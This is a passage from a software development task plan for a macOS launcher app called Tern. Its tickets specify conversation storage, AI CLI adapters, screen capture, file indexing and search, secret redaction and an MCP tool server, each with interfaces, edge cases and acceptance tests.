- **Model:** HAIKU
- **Goal:** Implement `workspace.rs` (Arch 7.2 step 3, 8.3, 8.4 to 8.6 config file contents, 14.1 cleanup).
- **Depends on:** T-003
- **Files:** `crates/tern-core/src/workspace.rs`; test `test/rust/tests/workspace.rs`.
- **Interfaces:**
```rust
pub struct Workspace { pub dir: PathBuf, pub attachments_dir: PathBuf }
pub fn prepare(paths: &TernPaths, conversation_id: &str, mcp_server_path: &Path) -> Result<Workspace, CoreError>;
pub fn add_attachment(ws: &Workspace, src: &Path) -> Result<PathBuf, CoreError>;
pub fn ensure_system_prompt(paths: &TernPaths) -> Result<PathBuf, CoreError>;
pub fn cleanup_stale(paths: &TernPaths, max_age: Duration, keep: &HashSet<String>) -> Result<usize, CoreError>;
pub const DEFAULT_SYSTEM_PROMPT: &str;
```
- **Details:** `prepare` creates dir (0700), `attachments/`, writes `mcp.json` and `.agents/mcp_config.json` per Arch 8.4 and 8.6 using `serde_json` (never string concatenation). `add_attachment` copies with a unique name `att-<n>-<original file name sanitized to [A-Za-z0-9._-]>`, rejects files over 20 MB and non-regular files. `ensure_system_prompt` writes `DEFAULT_SYSTEM_PROMPT` (Arch 8.3 text) if the file is missing. `cleanup_stale` deletes workspace dirs whose mtime is older than `max_age` and whose id is not in `keep`.
- **Edge cases:** invalid conversation id (`paths::validate_id`), attachment that is a symlink (resolve and copy target if regular), name collisions, read-only source.
- **Acceptance:** JSON files parse and contain the exact `command` and `args`; tests for every edge case.
- **Test:** `cargo test -p tern-tests --test workspace`.

## T-018 Conversation state store
- **Model:** HAIKU
- **Goal:** Implement `state.rs` per Arch 14.3.
- **Depends on:** T-003
- **Files:** `crates/tern-core/src/state.rs`; test `test/rust/tests/state.rs`.
- **Interfaces:**
```rust
pub struct StateStore { conn: Mutex<rusqlite::Connection> }
pub struct Conversation { pub id: String, pub provider_id: String, pub provider_session_id: Option<String>, pub title: String, pub created_unix_ms: i64, pub updated_unix_ms: i64 }
pub struct StoredMessage { pub role: Role, pub text: String, pub attachments: Vec<String>, pub created_unix_ms: i64 }
pub enum Role { User, Assistant, Error }
impl StateStore {
    pub fn open(path: &Path) -> Result<Self, CoreError>;
    pub fn create_conversation(&self, provider_id: &str, first_prompt: &str) -> Result<Conversation, CoreError>;
    pub fn get_conversation(&self, id: &str) -> Result<Option<Conversation>, CoreError>;
    pub fn set_session_id(&self, id: &str, session_id: &str) -> Result<(), CoreError>;
    pub fn append_message(&self, id: &str, msg: &StoredMessage) -> Result<(), CoreError>;
    pub fn list_conversations(&self, limit: u32) -> Result<Vec<(Conversation, u32)>, CoreError>;
    pub fn messages(&self, id: &str) -> Result<Vec<StoredMessage>, CoreError>;
    pub fn prune(&self, keep: u32) -> Result<usize, CoreError>;
    pub fn shrink_memory(&self) -> Result<(), CoreError>;
}
```
- **Details:** pragmas as Arch 10.1 except `cache_size=-1024`. Ids via `uuid::Uuid::new_v4()` hyphenated. Title rule Arch 14.3. `append_message` updates `updated_unix_ms`. `list_conversations` ordered by `updated_unix_ms DESC` with message counts.
- **Edge cases:** unknown conversation id on append (`InvalidInput`), empty prompt title becomes "Image question", attachments JSON round trip with non-ASCII paths, concurrent appends from two threads (mutex).
- **Acceptance:** tests for every method, prune keeps the newest N.
- **Test:** `cargo test -p tern-tests --test state`.

## T-019 Claude adapter
- **Model:** SONNET (event mapping against real fixtures)
- **Goal:** Implement Arch 8.4.
- **Depends on:** T-013, T-017; T-016 is a soft dependency: if real fixtures are not committed yet, build against the shapes in Arch 8.4 plus `test/fixtures/providers/fake/hello.jsonl`, and re-run and fix the tests when T-016 lands.
- **Files:** `crates/tern-core/src/providers/claude.rs`; edit `providers/fake.rs` to reuse `ClaudeParser`; test `test/rust/tests/provider_claude.rs`.
- **Interfaces:** `pub struct ClaudeProvider;` implementing `Provider`; `pub struct ClaudeParser { ... }` implementing `EventParser`; `pub fn version_at_least(version: &str, min: (u32, u32, u32)) -> bool` (parses the first `x.y.z` in the string).
- **Details:** command exactly as Arch 8.4 for both AI modes; prompt via stdin; image attachments add the trailing lines; `--permission-prompts none` only when `version_at_least(v, (2,1,259))`; `--model` when `turn.model` is set; `--resume` when `resume_session_id` is set. `detect`: `--version` and `auth status` with 3 s timeouts each. Capabilities: images `ViaPath`, resume true, streaming true, stdin true, injection `CliFlag`.
- **Verify:** that `Glob` and `Grep` appear in the `system/init` tools list when named in `--tools` (Arch 8.4 note); record the result in `docs/RESEARCH.md`.
- **Edge cases:** `result` line with `is_error: true` and a message; `result` where `result` is not a string; tool_use input that is huge (truncate detail to 200 chars); missing `session_id`; unknown line types; version string like `2.1.300 (Claude Code)`.
- **Acceptance:** every committed claude fixture parses to the expected event sequence (write expected sequences as Rust literals in the test); `build_command` snapshot tests for read-only, allow-edits, resume, image, old version without `--permission-prompts`.
- **Test:** `cargo test -p tern-tests --test provider_claude`.

## T-020 Ask orchestration in the core and FFI
- **Model:** SONNET (concurrency and lifecycle)
- **Goal:** `Core::ask`, `cancel_ask`, `providers`, `conversations`, `conversation_messages`, listener delivery (Arch 6, 7.2, 13).
- **Depends on:** T-018, T-019, T-014
- **Files:** edit `crates/tern-core/src/core.rs`; edit `crates/tern-ffi/src/lib.rs` (all ask-related records, enums, methods, `CoreListener` wiring); test `test/rust/tests/core_ask.rs`.
- **Interfaces (core side):**
```rust
pub trait CoreEvents: Send + Sync {
    fn ask_event(&self, ask_id: &str, event: AskEventCore);
    fn index_status(&self, status: IndexStatusCore);
    fn ai_capture(&self, path: &str);
}
impl Core {
    pub fn open_with_events(home: Option<PathBuf>, events: Arc<dyn CoreEvents>) -> Result<Core, CoreError>;
    pub fn ask(&self, req: AskRequestCore) -> Result<String, CoreError>;
    pub fn cancel_ask(&self, ask_id: &str);
    pub fn providers(&self) -> Vec<ProviderStatusCore>;
    pub fn refresh_providers(&self) -> Vec<ProviderStatusCore>;
    pub fn conversations(&self, limit: u32) -> Result<Vec<ConversationSummaryCore>, CoreError>;
    pub fn conversation_messages(&self, id: &str) -> Result<Vec<StoredMessage>, CoreError>;
}
```
  (`*Core` types mirror the FFI types in Arch 6 field for field; tern-ffi converts.)
- **Details:** steps of Arch 7.2 in order. Implement `Core::shutdown` and startup housekeeping exactly as Arch 13; `AppDelegate.applicationWillTerminate` calls `core.shutdown()`. Provider detection is cached after the first call; `refresh_providers` re-runs detection. Concurrency limits from 7.2 step 9. First turn of a conversation emits `Started`, then `SessionBound` when the parser reports a session id (store it). Store the user message before spawning and the assistant message (or error message) after completion. The MCP server path is `<dir of current executable>/tern-mcp` when it exists, else env `TERN_MCP_PATH`, else turns run without MCP and emit one `Warning`. Ask ids are UUID v4.
- **Edge cases:** provider disabled or not installed (`Failed { NotInstalled }` event and `Ok(ask_id)` so the UI path is uniform); conversation belongs to another provider (start a new conversation and emit `Warning`); attachments missing; two asks on one conversation (`ProviderBusy` error); shutdown during an ask (cancel and join).
- **Acceptance:** with the fake provider: an ask produces the full event sequence through `CoreEvents`, the conversation and two messages are stored, a follow-up passes the stored session id to `build_command` (assert via a spy provider in the test), cancel produces `Cancelled`.
- **Test:** `cargo test -p tern-tests --test core_ask`.

## T-021 Ask UI
- **Model:** SONNET (AppKit text rendering, streaming updates)
- **Goal:** Tab into ask mode, send, watch the answer stream, cancel, copy (Arch 5.4).
- **Depends on:** T-020, T-010
- **Files:** `shell/macos/Sources/TernApp/AskView.swift`, `shell/macos/Sources/TernKit/MarkdownRenderer.swift`, edit `LauncherViewController.swift`, `CoreBridge.swift`, `StatusItemController.swift`; test `test/swift/MarkdownRendererTests.swift`.
- **Interfaces:**
```swift
public enum MarkdownRenderer {
    public static func render(_ markdown: String, baseFont: NSFont, textColor: NSColor) -> NSAttributedString
}
@MainActor final class AskView: NSView {
    var onSend: ((String) -> Void)?
    var onCancel: (() -> Void)?
    func beginTurn(prompt: String, providerName: String)
    func apply(_ event: AskEvent)
    func reset()
}
```
- **Details:** transcript is an `NSTextView` (non-editable, selectable) inside a scroll view; prompt input is a multi-line `NSTextView` of 1 to 5 lines; provider badge shows the default provider name; status line shows "Thinking...", tool activity ("Reading file...") or token counts on completion. `TextDelta` appends plain text; `TextFinal` re-renders the whole assistant block as Markdown via `MarkdownRenderer` (uses `AttributedString(markdown:options:)` with `.inlineOnlyPreservingWhitespace` fallback when full parsing throws; code spans and blocks use `NSFont.monospacedSystemFont`). Render throttling: coalesce deltas and update the text view at most every 50 ms. `Failed` shows a red message with a hint per kind (NotInstalled: "Install <cli> and run it once in Terminal to log in"; NotLoggedIn: "Run `<cli>` in Terminal to log in"; RateLimited; Timeout; Cancelled). Status item shows a small dot while any ask runs.
- **Edge cases:** events for an ask id that is no longer displayed (ignore after `reset`); very long answers (text view handles it; no re-render of the whole transcript per delta); panel hidden while running (keeps running; reopening shows progress); Cmd+. cancels.
- **Acceptance:** with `TERN_FAKE_PROVIDER` set, asking shows "Hello, world" streaming then rendered; with Claude installed and logged in, a real question streams an answer.
- **Test:** Markdown tests (bold, code block monospaced, invalid Markdown falls back without crashing); manual end-to-end.

---

# M3 Screenshot

## T-022 Capture in the core and FFI
- **Model:** SONNET
- **Goal:** `Core::capture` with retention (Arch 12.1, 12.2).
- **Depends on:** T-011, T-020
- **Files:** `crates/tern-core/src/capture.rs`; edit `core.rs`, `tern-ffi/src/lib.rs` (`capture`, `CaptureMode`, `Capture`); test `test/rust/tests/capture.rs`.
- **Interfaces:**
```rust
pub fn capture_file_name(now: SystemTime, rand4: u16) -> String;
pub fn enforce_retention(dir: &Path, max_age: Duration, max_files: usize) -> Result<usize, CoreError>;
impl Core { pub fn capture(&self, mode: CaptureMode) -> Result<Option<CaptureInfo>, CoreError>; }
```
- **Details:** file name format Arch 12.1 in UTC. Retention runs after each successful capture and once at startup on a background thread. Only `cap-*.png` files are touched.
- **Edge cases:** user cancels (Ok(None)); captures dir deleted while running (recreate); clock skew (files with future mtime are kept).
- **Acceptance:** retention tests with synthetic files and mtimes (`filetime` dev-dependency in `tern-tests`).
- **Test:** `cargo test -p tern-tests --test capture`.

## T-023 Capture UI and capture-and-ask hotkey
- **Model:** SONNET
- **Goal:** Option+Shift+Space or Cmd+Shift+S captures a region and opens ask mode with the image attached (Arch 7.3).
- **Depends on:** T-022, T-021
- **Files:** `shell/macos/Sources/TernApp/Permissions.swift`, `shell/macos/Sources/TernKit/ThumbnailLoader.swift`, edit `AskView.swift` (attachment strip with removable thumbnails), `LauncherViewController.swift`, `AppDelegate.swift` (second hotkey), `StatusItemController.swift` ("Capture and Ask" menu item).
- **Interfaces:**
```swift
enum Permissions {
    static func screenCaptureGranted() -> Bool
    static func requestScreenCapture() -> Bool
    static func openScreenRecordingSettings()
}
public enum ThumbnailLoader { public static func thumbnail(at url: URL, maxPixel: Int) -> NSImage? }
```
- **Details:** before the first capture, if not granted, show an explainer alert with "Open System Settings" (URL `x-apple.systempreferences:com.apple.preference.security?Privacy_ScreenCapture`) and call `requestScreenCapture`. Hide the panel, wait 150 ms for the window server, then capture on `coreQueue`. Thumbnail via `CGImageSourceCreateThumbnailAtIndex` with `kCGImageSourceThumbnailMaxPixelSize = 256` and `kCGImageSourceCreateThumbnailFromImageAlways = true`. If the selected provider's `supportsImages` is `unverified`, show a one-line warning under the strip.
- **Edge cases:** user presses Esc during capture (panel reopens in its previous state, nothing attached); capture error (show message in the ask view); up to 4 attachments per ask; removing an attachment.
- **Acceptance:** capture-and-ask then asking Claude "what is in this image" returns a description.
- **Test:** `test/swift/ThumbnailLoaderTests.swift` with a generated PNG in a temp dir; manual end-to-end.

---

# M4 More providers

## T-024 Codex adapter
- **Model:** SONNET (unverified flags to confirm)
- **Goal:** Implement Arch 8.5.
- **Depends on:** T-019, T-016
- **Files:** `crates/tern-core/src/providers/codex.rs`; register in the registry; test `test/rust/tests/provider_codex.rs`.
- **Details:** command per Arch 8.5: flags before `resume`, `-i` for images and the `-c mcp_servers.tern.*` overrides are already decided there (VERIFIED by the T-016 fixtures); whether the server starts is settled in T-036, so keep `mcp_injection = McpInjection::ConfigOverride` until then. Event mapping follows the Arch 8.5 table exactly: `error` stores `last_error` and emits nothing, `turn.failed` emits `Failed` from `error.message` with `last_error` as fallback, at most one `Failed` per turn, `item.completed` with `item.type == "error"` emits `Warning`. Tool item types are unverified (no fixture has them), so test them with hand-written lines only and say so in the test names. `system prompt` is prepended inside `<tern_context>` on first turns only. Images via `-i` with comma-joined absolute attachment paths. Capabilities: images `Native`, resume true, streaming false, stdin true.
- **Edge cases:** `turn.failed` without `error.message` (use `last_error`); `error` and `turn.failed` in one turn (one `Failed`); multiple `agent_message` items (last wins); `item.completed` error items followed by success (`Warning` only).
- **Acceptance:** all codex fixtures map to expected sequences; command snapshot tests for read-only, allow-edits, resume, image.
- **Test:** `cargo test -p tern-tests --test provider_codex`.

## T-025 Antigravity adapter
- **Model:** SONNET (unverified event fields)
- **Goal:** Implement Arch 8.6.
- **Depends on:** T-019, T-016
- **Files:** `crates/tern-core/src/providers/agy.rs`; registry; test `test/rust/tests/provider_agy.rs`; one extra fixture `test/fixtures/providers/agy/sandbox.jsonl` (with its `.stderr.txt` and `.exit.txt`) and its capture case in `scripts/capture-fixtures.sh`; update `docs/RESEARCH.md` for `--sandbox` and `--add-dir`.
- **Details:** command per Arch 8.6; prompt passed as one argv element after `-p`; system context prepended on first turns. Event mapping follows the Arch 8.6 table exactly: lines are keyed by top-level `event`, deltas come from `step_update.text_delta` on `agent_response` steps, tool steps finish on `DONE` or `ERROR`, `result` handling includes the `denied_actions` warning. `streaming_text = true`. `ImageSupport::ViaPath` (VERIFIED). Capture one extra fixture with both `--sandbox` and `--add-dir <dir>` to confirm that agy accepts them; if it rejects either, stop and report instead of changing Arch 8.6.
- **Edge cases:** `result.status` values other than `SUCCESS`; empty `response` with `denied_actions` (Warning then `Completed`, no `TextFinal`); `step_update` with `state == "ERROR"`; the final `DONE` delta `"\n"` (a non-empty delta, so it is emitted as `TextDelta`); missing `conversation_id`.
- **Acceptance:** fixtures map correctly; command snapshot tests.
- **Test:** `cargo test -p tern-tests --test provider_agy`.

## T-026 Provider switching, follow-ups and history
- **Model:** SONNET
- **Goal:** Pick a provider per ask, continue conversations, browse recent ones.
- **Depends on:** T-024, T-025, T-021
- **Files:** edit `AskView.swift` (provider popup button listing enabled and installed providers, ordered as in settings; Cmd+1..4), `LauncherViewController.swift` (Cmd+N new conversation, follow-ups reuse `conversation_id`), create `shell/macos/Sources/TernApp/HistoryMenu.swift` (button in ask view showing the last 20 conversations via `core.conversations(20)`; choosing one loads messages and continues it).
- **Details:** not-installed providers appear disabled with a tooltip from `ProviderStatus.note`. A follow-up with a different provider starts a new conversation and the view says so. History loads messages via `conversation_messages`.
- **Edge cases:** provider removed from PATH between asks (refresh on failure with `NotInstalled`); conversation from a disabled provider (read-only view, "Continue with..." disabled).
- **Acceptance:** ask Claude, follow-up keeps context ("what did I just ask?"); switch to Codex starts a new conversation; reopen an old conversation from history and continue it.
- **Test:** manual; Rust side already covered by T-020.

---

# M5 File search

## T-027 Redaction
- **Model:** HAIKU
- **Goal:** Implement `redact.rs`.
- **Depends on:** T-003
- **Files:** `crates/tern-core/src/redact.rs`; dep `regex`; test `test/rust/tests/redact.rs`.
- **Interfaces:** `pub struct Redactor { ... }`, `pub fn shared() -> &'static Redactor` (via `std::sync::OnceLock`), `impl Redactor { pub fn redact(&self, text: &str) -> (String, u32) }` returning the redacted text and the number of replacements.
- **Patterns (kind label in brackets):** `-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z ]*PRIVATE KEY-----` [private_key]; `AKIA[0-9A-Z]{16}` [aws_key]; `gh[pousr]_[A-Za-z0-9]{36,}` [github_token]; `github_pat_[A-Za-z0-9_]{22,}` [github_token]; `xox[abprs]-[A-Za-z0-9-]{10,}` [slack_token]; `sk-ant-[A-Za-z0-9_-]{20,}` [anthropic_key]; `sk-(proj-)?[A-Za-z0-9_-]{20,}` [openai_key]; `AIza[0-9A-Za-z_-]{35}` [google_key]; `eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}` [jwt]; `(?i)\b(password|passwd|secret|token|api[_-]?key|access[_-]?key)\b\s*[:=]\s*["']?([^\s"']{6,})` [assignment] where only capture group 2 is replaced.
- **Details:** replacement text `[REDACTED:<kind>]`. Apply patterns in the listed order. Input over 1 MiB is processed in full (callers already cap size).
- **Edge cases:** overlapping matches; Unicode text around matches; `token = abc` (value under 6 chars, not redacted); multiline private key.
- **Acceptance:** one positive and one negative test per pattern.
- **Test:** `cargo test -p tern-tests --test redact`.

## T-028 Index schema and migrations
- **Model:** HAIKU
- **Goal:** Implement Arch 10.1 and 10.2.
- **Depends on:** T-003
- **Files:** `crates/tern-core/src/index/schema.rs`, `index/mod.rs`; test `test/rust/tests/index_schema.rs`.
- **Interfaces:**
```rust
pub const SCHEMA_VERSION: u32 = 1;
pub fn open_rw(path: &Path) -> Result<Connection, CoreError>;
pub fn open_ro(path: &Path) -> Result<Connection, CoreError>;
pub fn migrate(conn: &mut Connection) -> Result<(), CoreError>;
pub fn rebuild(path: &Path) -> Result<Connection, CoreError>;
pub fn db_bytes(path: &Path) -> u64;
```
- **Details:** `open_rw` applies pragmas and `migrate`. `open_ro` uses `OpenFlags::SQLITE_OPEN_READ_ONLY | SQLITE_OPEN_NO_MUTEX` plus `query_only`. `rebuild` deletes the db, `-wal`, `-shm` and reopens. `db_bytes` sums the three files. Verify at startup that `sqlite_version()` is at least 3.43.0; else `ErrorKind::Index`.
- **Edge cases:** newer schema version on disk (error, Arch 10.2); corrupted file (error from rusqlite mapped to `Index` with "Rebuild index" in the message); read-only open when the file does not exist (`Index` error "index not built").
- **Acceptance:** migration creates all tables and triggers; inserting and deleting a `files` row keeps `names_fts` in sync (query it); deleting a files row removes its `content_fts` row.
- **Test:** `cargo test -p tern-tests --test index_schema`.

## T-029 Extraction and exclusion rules
- **Model:** HAIKU
- **Goal:** Implement Arch 10.3 and 10.4 as pure functions.
- **Depends on:** T-028
- **Files:** `crates/tern-core/src/index/extract.rs`; deps `globset`; tests `test/rust/tests/extract.rs`; add sample files under `test/fixtures/corpus/` (a `.md`, a `.rs`, a binary `.bin` with NUL bytes, a `.env`, a `notes` file without extension, a nested `node_modules/x.js`).
- **Interfaces:**
```rust
pub struct Exclusions { set: GlobSet }
impl Exclusions {
    pub fn new(extra: &[String]) -> Result<Self, CoreError>;
    pub fn is_excluded(&self, path: &Path) -> bool;
}
pub enum ContentState { NotAttempted = 0, Indexed = 1, TooLarge = 2, Binary = 3, Excluded = 4, ReadError = 5, NotText = 6 }
pub fn extract_text(path: &Path, size: u64, max_bytes: u64) -> (ContentState, Option<String>);
pub fn is_known_text_ext(ext: &str) -> bool;
```
- **Edge cases:** uppercase extensions; files named `Dockerfile` or `Makefile` (treat file names `dockerfile`, `makefile`, `readme`, `license` as text); invalid UTF-8 (lossy); empty file (`Indexed` with empty text); CRLF normalization.
- **Acceptance:** every corpus file classified as expected.
- **Test:** `cargo test -p tern-tests --test extract`.

## T-030 Indexer reconcile
- **Model:** SONNET (streaming walk, transactions, thread ownership)
- **Goal:** Implement Arch 10.5 reconcile and incremental batches, and the indexer thread.
- **Depends on:** T-029, T-027, T-011
- **Files:** `crates/tern-core/src/index/indexer.rs`; dep `ignore`; test `test/rust/tests/indexer.rs`.
- **Interfaces:**
```rust
pub enum IndexCommand { Reconcile { root: PathBuf }, ReconcileAll, Paths(Vec<PathBuf>), SetRoots(Vec<PathBuf>), Rebuild, Stop }
pub struct IndexerHandle { pub tx: Sender<IndexCommand>, join: Option<JoinHandle<()>> }
pub fn spawn_indexer(db_path: PathBuf, settings: IndexerSettings, platform: Arc<dyn Platform>, on_status: Box<dyn Fn(IndexStatusCore) + Send>) -> Result<IndexerHandle, CoreError>;
pub struct IndexerSettings { pub max_content_file_bytes: u64, pub exclusions: Vec<String> }
impl IndexerHandle { pub fn stop(self, timeout: Duration); }
pub fn reconcile_root(conn: &mut Connection, root_id: i64, root: &Path, ex: &Exclusions, s: &IndexerSettings, progress: &mut dyn FnMut(u64)) -> Result<ReconcileStats, CoreError>;
pub fn apply_paths(conn: &mut Connection, roots: &[(i64, PathBuf)], paths: &[PathBuf], ex: &Exclusions, s: &IndexerSettings) -> Result<ReconcileStats, CoreError>;
pub struct ReconcileStats { pub added: u64, pub updated: u64, pub unchanged: u64, pub deleted: u64, pub errors: u64 }
```
- **Details:** exactly Arch 10.5. `SetRoots` inserts missing roots, deletes removed ones (cascade), and reconciles new ones. Status callback throttled to 500 ms. `mtime_ns` from `metadata.modified()` as nanoseconds since epoch. The thread calls `platform.set_background_priority()` first.
- **Edge cases:** file deleted between walk and read (`ReadError`, row kept until next reconcile); permission denied directories (skip, count error, log path once); root removed from disk (mark index error for that root, keep running); 1,000,000-file root (memory stays flat: no collecting); file modified during read (next event picks it up).
- **Acceptance:** reconcile of `test/fixtures/corpus` gives the expected rows and states; second reconcile reports all unchanged; deleting a file then reconciling deletes its row and FTS entries; generated 20k-file corpus (use xtask `gen-corpus` from T-043 if present, else generate in the test) completes and peak RSS of the test process stays under 90 MB (measure with `footprint` via libc in the test on macOS).
- **Test:** `cargo test -p tern-tests --test indexer`.

## T-031 Watcher
- **Model:** SONNET (notify specifics, debounce)
- **Goal:** Implement Arch 10.6 and connect it to the indexer.
- **Depends on:** T-030
- **Files:** `crates/tern-core/src/index/watcher.rs`; dep `notify`; test `test/rust/tests/watcher.rs`.
- **Interfaces:**
```rust
pub struct WatchHandle { ... }
pub fn spawn_watcher(roots: Vec<PathBuf>, indexer: Sender<IndexCommand>, debounce: Duration, cap: usize) -> Result<WatchHandle, CoreError>;
impl WatchHandle { pub fn stop(self); }
```
- **Details:** watcher callback only pushes into a bounded channel; a debouncer thread owns the `HashSet` and flushes `IndexCommand::Paths` after `debounce` of quiet; overflow sends `Reconcile { root }` for the root(s) involved. Excluded paths are dropped early using `Exclusions`.
- **Edge cases:** burst of 50,000 events (overflow path), rename events (both old and new paths flushed), root deleted, stop while events pending (flush nothing, exit).
- **Acceptance:** create, modify, delete and rename a file under a temp root; within 2 s the index reflects each change (poll the db).
- **Test:** `cargo test -p tern-tests --test watcher` (macOS and Linux).

## T-032 Query engine
- **Model:** SONNET (FTS query building, ranking)
- **Goal:** Implement Arch 10.7.
- **Depends on:** T-030, T-027
- **Files:** `crates/tern-core/src/index/query.rs`; test `test/rust/tests/query.rs`.
- **Interfaces:**
```rust
pub enum SearchMode { Auto, Name, Content }
pub struct Hit { pub file_id: i64, pub path: PathBuf, pub name: String, pub score: f64, pub snippet: Option<String>, pub size: u64, pub mtime_ns: i64, pub match_kind: MatchKindCore }
pub fn quote_token(t: &str) -> String;
pub fn build_content_match(tokens: &[&str]) -> Option<String>;
pub fn search(conn: &Connection, query: &str, mode: SearchMode, limit: usize, now: SystemTime, snippets: bool) -> Result<Vec<Hit>, CoreError>;
pub fn make_snippet(path: &Path, tokens: &[&str], max_bytes: u64) -> Option<String>;
```
- **Details:** exactly Arch 10.7 including RRF weights and tie-breaks; snippets only for the top 10 and only when `snippets` is true; every snippet goes through `redact::shared()`.
- **Edge cases:** query with quotes, `*`, `NEAR`, `AND`, `-`, `:` (all treated literally); emoji and CJK (CJK content matching is limited with unicode61; names work via trigram); a hit whose file was deleted (skip it and do not count toward limit); limit 0 (empty); limit above 50 (clamped).
- **Acceptance:** on the corpus, searching a filename fragment ranks that file first; a content word finds the right file with a snippet; a secret inside a corpus file appears redacted in the snippet; 100 random queries over the 20k corpus each finish under 30 ms p95 (assert under 100 ms in CI).
- **Test:** `cargo test -p tern-tests --test query`.

## T-033 File search in the panel
- **Model:** SONNET
- **Goal:** Arch 7.1 end to end: file rows with actions.
- **Depends on:** T-032, T-031, T-010
- **Files:** edit `core.rs` (start indexer and watcher in `open_with_events` from settings roots; `search`, `index_status`, `reindex`; restart both on settings changes to roots or exclusions), `tern-ffi/src/lib.rs` (`search`, `FileHit`, `IndexStatus`, `reindex`), `ResultsListView.swift` (file row: icon from `NSWorkspace.shared.icon(forFile:)` cached by extension, name, dimmed parent path, snippet line), `LauncherViewController.swift` (actions from Arch 5.4).
- **Details:** search runs only when input has at least 2 chars; calc row (if any) first, then up to 20 file hits. Open with `NSWorkspace.shared.open(URL(fileURLWithPath:))`; reveal with `activateFileViewerSelecting`. Option+Enter switches to ask mode with the file in `attachments`.
- **Edge cases:** index not built yet (show a single row "Add folders to index in Settings"); index error (row with the message and "Rebuild" action calling `reindex`); file missing at open time (show error row).
- **Acceptance:** with `~/Documents` indexed, typing part of a filename shows it first within 30 ms; Enter opens it; Cmd+Enter reveals it.
- **Test:** manual; membench phase `panel_shown` now includes file results.

## T-034 Index folders in Settings (minimal)
- **Model:** HAIKU
- **Goal:** Add and remove index roots before the full settings window exists.
- **Depends on:** T-033
- **Files:** create `shell/macos/Sources/TernApp/SettingsWindowController.swift` with only an "Index" tab: table of roots, "+" (NSOpenPanel, directories only, multiple), "-", status text from `index_status` (files, content indexed, db size formatted with `ByteCountFormatter`), "Rebuild index" button.
- **Details:** changes call `update_settings`; validation errors from the core shown in an alert.
- **Edge cases:** adding a root inside another root (core rejects; alert), adding `~` itself (rejected), removing the last root (allowed).
- **Acceptance:** adding a folder starts indexing (status updates live via `onIndexStatus`).
- **Test:** manual.

---

# M6 MCP

## T-035 `tern-mcp` server: calculate, search_files, read_file
- **Model:** SONNET (rmcp API)
- **Goal:** Implement Arch 9.1 to 9.3 for three tools.
- **Depends on:** T-032, T-009, T-027
- **Files:** `crates/tern-mcp/Cargo.toml` (deps `rmcp` 3.x with features `server`, `transport-io`, `macros`, `schemars`; `tokio` with `rt`, `io-std`, `macros`; `schemars`; `serde`; `serde_json`; `tern-core`), `src/lib.rs` (`pub async fn serve(home: Option<PathBuf>) -> Result<(), CoreError>` and the server struct), `src/tools.rs` (pure functions `pub fn do_calculate(...)`, `pub fn do_search(...)`, `pub fn do_read(...)` returning `Result<String, String>` so they are testable without MCP), `src/main.rs` (arg parsing for `--home` and `--version`, current-thread runtime, logging to `mcp_log_file`); test `test/rust/tests/mcp_tools.rs` and `test/rust/tests/mcp_protocol.rs`.
- **Details:** follow the rmcp 3.x README server example (`#[tool_router]`, `#[tool]`, `#[tool_handler]`, `ServerHandler::get_info`). Input structs derive `Deserialize` and `JsonSchema` with the bounds from Arch 9.2 enforced again in code. `read_file` canonicalization and root check per Arch 16.3 T9; roots read from `config.toml` via `Settings::load`. Output formats exactly as Arch 9.2.
- **Edge cases:** missing index (tool error text from Arch 9.2 style); settings unreadable (use defaults: no roots, so read_file always refuses); path to a directory; offset beyond EOF (empty content, `truncated=false`); binary file (refuse); huge `limit` (clamped by schema and code).
- **Acceptance:** `mcp_protocol.rs` spawns the built `tern-mcp` binary, sends `initialize`, `notifications/initialized`, `tools/list` (expects four tools once T-037 lands; three now), and `tools/call` for each tool over stdio JSON-RPC lines, asserting responses. `tern-mcp` footprint after initialize under 10 MB (measured in the test on macOS).
- **Test:** `cargo test -p tern-tests --test mcp_tools --test mcp_protocol`.

## T-036 Per-turn MCP injection
- **Model:** SONNET
- **Goal:** App-initiated asks give each CLI access to `tern-mcp` (Arch 9.4).
- **Depends on:** T-035, T-024, T-025
- **Files:** edit `providers/claude.rs`, `codex.rs`, `agy.rs` (already build flags; verify end to end), `core.rs` (MCP path resolution from T-020), `xtask` bundle (already places `tern-mcp`); update `docs/RESEARCH.md`.
- **Details:** manual verification script `scripts/verify-mcp.sh` that runs each CLI headless with the injection and the prompt "Use the tern calculate tool to compute 12 km to mi and report the tool output", and prints whether the tool was called (grep the JSONL for the tool name). For any provider where it fails, set its `mcp_injection` to `None` and make the ask view show a one-time hint "Tern tools are not available to <provider> in app asks. Use Settings > AI > Install into my CLIs."
- **Edge cases:** `tern-mcp` missing from bundle (asks still work, `Warning` once).
- **Acceptance:** Claude calls `mcp__tern__calculate` in an app ask; results recorded for Codex and agy in RESEARCH.md.
- **Test:** `scripts/verify-mcp.sh` run by TP (human step noted in the PR).

## T-037 Screenshot service and `take_screenshot` tool
- **Model:** SONNET (Unix sockets, peer credentials)
- **Goal:** Implement Arch 12.3 and the fourth MCP tool.
- **Depends on:** T-035, T-022
- **Files:** `crates/tern-core/src/uds.rs`; edit `core.rs` (start or stop service when `allow_ai_screenshots` changes), `tern-mcp/src/tools.rs` and `lib.rs` (`take_screenshot` client: connect, send, read, then `downscale_png` and base64 encode); edit `CoreBridge.swift` (`onAiCapture` posts a `UNUserNotification` "AI took a screenshot" and flashes the status item for 2 s); test `test/rust/tests/uds.rs`.
- **Interfaces:**
```rust
pub struct ScreenshotService { ... }
impl ScreenshotService {
    pub fn start(socket: PathBuf, handler: Arc<dyn Fn() -> Result<CaptureInfo, CoreError> + Send + Sync>) -> Result<Self, CoreError>;
    pub fn stop(self);
}
pub fn request_capture(socket: &Path, timeout: Duration) -> Result<UdsCaptureResponse, CoreError>;
pub struct UdsCaptureResponse { pub ok: bool, pub path: Option<String>, pub width: Option<u32>, pub height: Option<u32>, pub error: Option<String>, pub message: Option<String> }
```
- **Details:** blocking `std::os::unix::net::UnixListener` on its own thread; stale socket file removed before bind; `getpeereid` via `libc`; 4 KB request cap; read timeout 2 s; rate limit 5 s; handler captures `FullScreen` into the captures dir. The MCP tool returns an image content item plus a text item.
- **Edge cases:** app not running (connect error maps to "Tern app is not running."); disabled (service not started, same error path but message "Screenshots by AI are disabled..." is returned when the socket exists but the service replied `disabled`); permission missing (capture returns only wallpaper; detect via Swift `Permissions.screenCaptureGranted()` stored in the core through a new `Core::set_screen_capture_granted(bool)` called by the shell at launch and after requests, and reply `no_permission` when false).
